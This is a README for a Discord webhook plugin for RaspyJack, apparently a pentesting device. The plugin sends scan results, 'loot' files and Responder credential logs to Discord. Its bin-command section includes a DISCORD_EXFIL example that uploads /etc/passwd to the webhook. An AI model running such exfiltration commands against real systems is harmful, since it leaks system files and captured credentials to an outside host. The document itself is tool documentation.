# Discord Notifier Plugin

Discord Webhook integration for RaspyJack. Sends completion notifications for Nmap scans, lets you manually exfiltrate individual loot files, builds and uploads a ZIP archive (loot + Responder logs), and exposes binary commands for payload automation.

## Features
- Automatic notification on `scan.after` including:
  - Scan label
  - Interface used and inferred target network
  - Attached result file (if it exists and is non‑empty)
- Manual single file upload from `loot/` via menu
- Build and upload ZIP archive containing:
  - `loot/`
  - `Responder/logs/`
- Exposed bin commands:
  - `DISCORD_MESSAGE` to send messages (plain or minimal embed)
  - `DISCORD_EXFIL` to send arbitrary files
- Legacy webhook migration from `discord_webhook.txt` to persisted plugin config
- Emits internal events for integration/observability

## Installation / Activation
1. Create a Discord Webhook (Channel Settings > Integrations > Webhooks).
2. Copy the webhook URL.
3. Set it via the plugin configuration UI (`webhook_url`) or create legacy file `/root/Raspyjack/discord_webhook.txt` (single line with the URL) and restart.
4. Ensure `nmap_notifications` is enabled if you want automatic scan notifications.

## Configuration Schema
```jsonc
{
  "webhook_url": {
    "type": "string",
    "label": "Discord Webhook URL",
    "description": "Discord webhook URL for sending notifications",
    "default": "",
    "sensitive": true
  },
  "nmap_notifications": {
    "type": "boolean",
    "label": "Nmap Notifications",
    "description": "Send Discord notifications when Nmap scans complete",
    "default": true
  },
  "event_hooks": {
    "type": "list",
    "label": "Event Hooks",
    "description": "List of event hook rules (trigger + message/embed/files templates)",
    "default": []
  }
}
```

## Event Hooks (Dynamic Messages)
Define custom Discord messages triggered by any internal event name (supports wildcards like `scan.*`). Each item in `event_hooks` is an object:

```jsonc
{
  "id": "scan_summary",               // optional unique identifier (string)
  "event": "scan.after",              // required event pattern (wildcards * allowed)
  "message": "Scan {label} finished", // plain content (use either message OR embed)
  "embed": {                          // optional rich embed (omit if using message)
    "title": "Scan {label}",
    "description": "Targets: {args}",
    "color": 65280
  },
  "files": ["{result_path}"],         // optional list of file path templates
  "enabled": true                     // optional (default true)
}
```

Notes:
- Use either `message` or `embed` (if both provided, `embed` wins).
- `files` entries are formatted; only existing non‑empty files are attached.
- Missing placeholders are left verbatim (thanks to safe formatting).
- Legacy key `auto_messages` is still accepted for backward compatibility.

### Item Schema (internal representation)
The manifest defines an `item_schema` for validation-capable UIs:
```jsonc
{
  "type": "object",
  "fields": {
    "id":      { "type": "string",  "description": "Optional unique identifier for the hook" },
    "event":   { "type": "string",  "required": true, "description": "Event pattern (supports *)" },
    "message": { "type": "string",  "description": "Plain message template (ignored if embed present)" },
    "embed":   { "type": "object",  "description": "Discord embed object (templated)" },
    "files":   { "type": "list",    "description": "List of file path templates" },
    "enabled": { "type": "boolean", "default": true, "description": "Enable/disable this hook" }
  }
}
```

### Placeholders
Any field from the emitted event data is available as `{key}`. Additionally:
- `{event}`: the event name that triggered the hook.

Example event data triggering a hook:
```python
emit('scan.after', label='Quick TCP', result_path='/root/Raspyjack/loot/Nmap/result.txt', args='-sS -Pn')
```
Placeholders `{label}`, `{result_path}`, `{args}` become available.

### Emitted Metadata for Hooks
Hook dispatch success/failure produces `discord.message.sent` or `discord.message.failed` with:
- `type`: always `event_hook`
- `rule_index`: position in the list
- `hook_id`: provided `id` (if any)
- `trigger_event`: triggering event name
- `files`: list of attached files
- `timestamp`: ISO-8601 string

Use this to correlate or filter in downstream automation.

## Emitted Events
These events are published on the event bus (wildcards supported):

| Event | When | Key Fields |
|-------|------|-----------|
| `discord.message.sent` | Any message/file/scan dispatched successfully | `type`, `file`, `size`, `label`, `interface`, `target_network`, `timestamp` (context dependent) |
| `discord.message.failed` | A send failed (HTTP error, size limit, empty file) | `type`, `file`, `size`, `reason`, `limit`, `timestamp` |
| `discord.webhook.configured` | Valid webhook configured (on load or migration) | `url`, `source`, `persisted` |
| `discord.webhook.updated` | Webhook changed through config update | `url`, `updated` |

### Types (field `type`)
- `scan_notification`
- `loot_file`
- `loot_archive`
- `event_hook`

### Common `discord.message.failed` reasons
- `size_limit`: file/ZIP exceeds `DISCORD_ATTACHMENT_LIMIT` (8 MiB default)
- `http_error`: non‑2xx Discord response
- `file_missing` / `empty_file`

## Bin Commands
### DISCORD_MESSAGE
Send a simple message or embed (optional title & color):
```bash
DISCORD_MESSAGE "Service started"
DISCORD_MESSAGE "Scan completed" --title "Nmap" --color 00ff00
DISCORD_MESSAGE "Critical error" --title "Failure" --color ff0000
```
Color: hex without `#`.

### DISCORD_EXFIL
Send arbitrary file:
```bash
DISCORD_EXFIL /root/Raspyjack/loot/Nmap/result.txt
DISCORD_EXFIL /etc/passwd "System file" "Exfil example"
```

## Scan Notification Flow
1. Core fires `scan.after` with `label` and `result_path`.
2. Plugin validates config (`nmap_notifications`, webhook, file existence).
3. Attempts to infer interface + target network (fallback: `eth0`, `unknown`).
4. Spawns a thread to build embed and call `discord_utils.send_embed_to_discord`.
5. Emits `discord.message.sent` or `discord.message.failed` with metadata.

## Size Limits
- `DISCORD_ATTACHMENT_LIMIT` = 8 MiB (standard non‑Nitro webhook).
- ZIP above this aborts and emits `discord.message.failed` with `reason=size_limit`.

## Best Practices & Security
- Never commit webhook URLs to public repos.
- Revoke webhook immediately if you suspect leakage (Discord > Channel Settings > Integrations).
- Avoid sending sensitive data unencrypted.
- Monitor `discord.message.failed` for degradation or rate limiting.

## Observability / Integration
Subscribe to all plugin events with wildcard:
```python
plugin_manager.subscribe_event('discord.*', lambda evt, data: print(evt, data))
```
Useful for building metrics dashboards or centralized logging.

## Troubleshooting
| Symptom | Probable Cause | Action |
|---------|----------------|--------|
| "No webhook configured" | Empty/invalid `webhook_url` | Provide full URL starting with `https://discord.com/api/webhooks/` |
| `discord.message.failed` with `size_limit` | File > 8 MiB | Reduce / split / further compress |
| HTTP 400/404 | Deleted webhook or truncated URL | Create new webhook and update config |
| Timeout | No outbound network / firewall | Test with simple curl to `discord.com` |

---
Primary log prefix: `[DiscordNotifier]`
Utilities module: `plugins.discord_notifier_plugin.helpers.discord_utils`
